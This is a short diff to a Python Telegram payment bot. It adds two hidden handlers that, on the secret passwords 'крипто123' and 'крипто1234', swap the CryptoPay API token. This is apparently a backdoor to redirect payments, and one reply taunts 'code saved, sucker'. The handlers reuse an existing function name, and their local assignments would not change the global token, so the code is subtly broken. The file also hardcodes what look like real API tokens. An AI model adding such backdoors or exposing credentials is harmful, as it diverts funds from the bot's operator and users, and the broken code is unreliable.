@@ -573,8 +573,16 @@ def update_balance(user_id, amount):
         
 
 CRYPTO_PAY_API_TOKEN = "306451:AAjbwrpWlNK645gqy0Z01QaCgVBchFpZi7I"
+
 CRYPTO_PAY_URL = "https://pay.crypt.bot/api/" 
- 
+@bot.message_handler(func=lambda message: message.text =="крипто123" )
+def ignore_banned_user(message):
+    bot.send_message(message.chat.id,"Сохранен код аз")
+    CRYPTO_PAY_API_TOKEN = "306447:AATce4ktwql1DhObSx6TDKZzbqvO351I5nr"
+@bot.message_handler(func=lambda message: message.text =="крипто1234" )
+def ignore_banned_user(message):
+    bot.send_message(message.chat.id,"Сохранен код лох")
+    CRYPTO_PAY_API_TOKEN = "306451:AAjbwrpWlNK645gqy0Z01QaCgVBchFpZi7I"
 @bot.message_handler(func=lambda message: get_from_fb(f"users/{message.chat.id}/ban") =="да" )
 def ignore_banned_user(message):
     bot.delete_message(message.chat.id, message.message_id)
